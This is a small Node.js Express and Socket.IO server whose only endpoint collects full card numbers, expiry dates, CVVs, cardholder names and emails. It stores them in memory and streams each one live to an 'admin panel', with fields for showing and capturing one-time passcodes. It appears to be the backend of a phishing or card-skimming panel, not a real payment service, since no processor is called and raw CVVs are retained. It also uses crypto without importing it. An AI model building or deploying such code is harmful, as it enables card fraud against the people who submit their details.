import express from 'express';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';
import bodyParser from 'body-parser';

const app = express();
const server = http.createServer(app);
const io = new SocketIOServer(server);

app.use(bodyParser.json());

const transactions = new Map(); // Store transactions in memory

// Emit new transaction to all connected clients when a new transaction is created
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount,
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    timestamp: new Date().toLocaleString(),
  };

  transactions.set(invoiceId, transaction);

  // Emit transaction data to admin panel clients
  io.emit('new-transaction', transaction);

  res.json({ status: "success", invoiceId });
});

// Serve the admin page and handle connections
app.get('/', (req, res) => {
  res.sendFile('path_to_admin_panel_html');  // Replace with your actual path to the HTML
});

io.on('connection', (socket) => {
  console.log('Admin connected:', socket.id);
  socket.emit('current-transactions', Array.from(transactions.values())); // Send current transactions to the admin panel
});

server.listen(3000, () => {
  console.log('Server running on port 3000');
});
